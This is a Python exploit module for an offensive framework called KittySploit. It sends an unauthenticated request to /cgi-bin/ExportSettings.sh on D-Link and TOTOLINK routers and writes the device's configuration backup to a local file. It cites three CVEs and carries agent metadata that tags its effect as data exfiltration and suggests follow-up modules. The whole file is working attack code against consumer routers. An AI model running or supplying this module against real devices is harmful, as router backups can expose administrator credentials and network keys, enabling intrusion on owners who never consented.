#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Dump D-Link/TOTOLINK config via unauthenticated ExportSettings.sh."""

import re

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Auxiliary, Http_client):
    __info__ = {
        'name': 'D-Link/TOTOLINK - ExportSettings.sh Config Dump',
        'description': (
            'Downloads the device configuration backup exposed by '
            '/cgi-bin/ExportSettings.sh without authentication '
            '(CVE-2018-17786 / CVE-2022-32993 / CVE-2023-53896).'
        ),
        'author': ['KittySploit Team'],
        'cve': ['CVE-2018-17786', 'CVE-2022-32993', 'CVE-2023-53896'],
        'platform': Platform.MULTI,
        'references': [
            'https://xz.aliyun.com/t/2834',
            'https://www.exploit-db.com/exploits/51556',
        ],
        'tags': ['dlink', 'totolink', 'config', 'exposure', 'unauth'],
        'agent': {
            'risk': 'intrusive',
            'effects': ['data_exfiltration'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': True,
            'produces': ['risk_signals'],
            'cost': 1.2,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [{'capability': 'admin_surface', 'from_detail': ''}],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['scanner/http/cve_2018_17786_detect'],
            },
        },
    }

    output_file = OptString(
        'exportsettings.dat',
        'Local file to write the downloaded config backup',
        required=False,
    )

    def run(self):
        path = '/cgi-bin/ExportSettings.sh'
        print_status(f'Fetching {path} ...')
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            print_error('ExportSettings.sh not accessible')
            return False
        ctype = (r.headers.get('Content-Type') or '')
        cdisp = (r.headers.get('Content-Disposition') or '')
        if 'application/octet-stream' not in ctype.lower():
            print_error(f'Unexpected Content-Type: {ctype}')
            return False
        if not re.search(r'attachment;\s*filename=', cdisp, re.I):
            print_warning(f'Unexpected Content-Disposition: {cdisp}')

        data = r.content or b''
        if not data:
            print_error('Empty response body')
            return False

        out = str(self.output_file or 'exportsettings.dat').strip() or 'exportsettings.dat'
        with open(out, 'wb') as fh:
            fh.write(data)
        print_success(f'Saved {len(data)} bytes to {out}')
        if cdisp:
            print_info(cdisp)
        return True
